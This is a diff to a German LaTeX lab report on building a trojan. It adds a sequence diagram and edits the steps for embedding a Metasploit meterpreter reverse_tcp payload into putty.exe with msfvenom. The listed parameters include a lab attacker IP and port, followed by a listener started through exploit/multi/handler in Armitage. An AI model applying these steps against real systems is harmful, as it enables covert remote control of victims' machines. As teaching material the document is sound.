@@ -38,12 +38,44 @@ Die Opfer nutzen das weit verbreitete Betriebssystem Windows 10. Mit folgenden U
 
 \subsection{Ablauf}\label{sec:praktischeDurchfuehrung-ablauf}
 
+\begin{figure}[h!]
+	\centering
+	\begin{sequencediagram}
+		\newthread{a}{Angreifer}
+		\tikzstyle{inststyle}+=[rounded corners=3mm]
+		\newinst{l}{Listener}
+		\newinst{t}{Trojaner}
+		\tikzstyle{inststyle}+=[rounded corners=false]
+		\newthread{v}{Opfer}
+		\begin{messcall}{a}{ Erstellen des Trojaners }{t}
+		\end{messcall}
+		\begin{messcall}{a}{ Aktivieren des Listeners }{l}	
+			\begin{call}{a}{ Bereitstellen des Trojaners }{a}{}
+				\begin{call}{v}{ Abrufen des Trojaners }{a}{Trojaner}
+				\end{call}
+				\begin{messcall}{v}{ Ausführen des Trojaners }{t}
+					\begin{call}{t}{ Aufbauen der Verbindung }{l}{}
+						\mess{l}{Information über Verbindungsaufbau}{a}
+					\end{call}
+					\begin{call}{a}{ Eingabe von Befehlen }{l}{}
+						\begin{call}{l}{ Senden von Befehlen }{t}{}
+							\begin{call}{t}{ Audführen von Befehlen }{v}{}
+							\end{call}
+						\end{call}
+					\end{call}
+				\end{messcall}
+			\end{call}	
+		\end{messcall}
+	\end{sequencediagram}
+	\caption{Ablauf} \label{fig:Ablauf}
+\end{figure}
+
 \textbf{1. Erstellen des Trojaners: } 
 Zunächst wird auf dem Angreifer der Trojaner erstellt.
 Ziel ist es den Payload \code{windows/meterpreter/reverse\_tcp} in ein normales Programm (hier das bekannte \code{putty.exe}) einzuschleusen. 
-Dies geschieht mit dem Befehl \code{msfvenom}. Wobei folgende parameter gesetzt werden:
+Dies geschieht mit dem Befehl \code{msfvenom} \cite{OSMSFV}. Wobei folgende parameter gesetzt werden:
 \begin{itemize}
-	\item \textbf{Payload}: \code{-p windows/meterpreter/reverse\_tcp}
+	\item \textbf{Payload}: \\\code{-p windows/meterpreter/reverse\_tcp}
 	      \begin{itemize}
 		      \item  \textbf{Angreifer-IP}: \code{lhost=192.168.100.101}
 		      \item \textbf{Angreifer-Port}: \code{lport=6666}
@@ -56,7 +88,8 @@ Dies geschieht mit dem Befehl \code{msfvenom}. Wobei folgende parameter gesetzt 
 	\item \textbf{Ausgabe (Trojaner)}: \code{-o puttyX.exe}
 \end{itemize}
 
-\textbf{2. Aktivieren des Listeners auf dem Angreifersystem: } \hfill \\
+\bigskip
+\textbf{2. Aktivieren des Listeners: } \hfill \\
 Für den Metasploit-Baukasten gibt es das Hilfsprogramm Armitage, dass die Möglichkeit bietet alle Einstellungen über eine grafische Oberfläche vorzunehmen.
 In Armitage wird der Listener über \code{exploit/multi/handler} gestartet. Hierfür muss dieser mit \code{Payload, Ip, Port} aus Schritt 1 konfiguriert werden.
 
